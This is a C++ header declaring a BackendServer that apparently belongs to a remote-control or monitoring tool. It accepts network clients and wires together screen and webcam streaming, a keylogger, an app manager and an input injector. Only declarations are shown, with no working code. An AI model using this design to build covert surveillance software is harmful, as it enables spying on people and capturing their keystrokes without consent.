#pragma once
#include <memory>
#include <thread>
#include <atomic>
#include <vector>
#include <unordered_map>
#include <mutex>
#include "core/BroadcastBus.hpp"
#include "core/StreamSession.hpp"
#include "interfaces/IKeylogger.hpp"
#include "interfaces/IAppManager.hpp"
#include "interfaces/IInputInjector.hpp"

#include "core/NetworkDefs.hpp"

namespace core {

    class BackendServer {
    public:
        BackendServer(
            uint16_t port,
            std::shared_ptr<BroadcastBus> bus_monitor,
            std::shared_ptr<BroadcastBus> bus_webcam,
            std::shared_ptr<StreamSession> session,
            std::shared_ptr<StreamSession> webcam_session,
            std::shared_ptr<interfaces::IKeylogger> keylogger,
            std::shared_ptr<interfaces::IAppManager> app_manager,
            std::shared_ptr<interfaces::IInputInjector> input_injector
        );
        ~BackendServer();

        // Blocking call (runs the accept loop)
        void run();

        // Signals stop
        void stop();

    private:
        void accept_loop();
        void handle_client(socket_t fd);

        // Protocol Helpers
        bool read_frame(socket_t fd, std::vector<uint8_t>& payload, uint32_t& cid, uint32_t& bid);
        bool send_frame(socket_t fd, const uint8_t* payload, uint32_t len, uint32_t cid, uint32_t bid);

    private:
        uint16_t port_;
        std::atomic<bool> running_{false};
        socket_t listen_fd_ = INVALID_SOCKET;
        std::shared_ptr<BroadcastBus> bus_monitor_;
        std::shared_ptr<BroadcastBus> bus_webcam_;
        std::shared_ptr<StreamSession> session_;
        std::shared_ptr<StreamSession> webcam_session_;
        std::shared_ptr<interfaces::IKeylogger> keylogger_;
        std::shared_ptr<interfaces::IAppManager> app_manager_;
        std::shared_ptr<interfaces::IInputInjector> input_injector_;
    };

} // namespace core
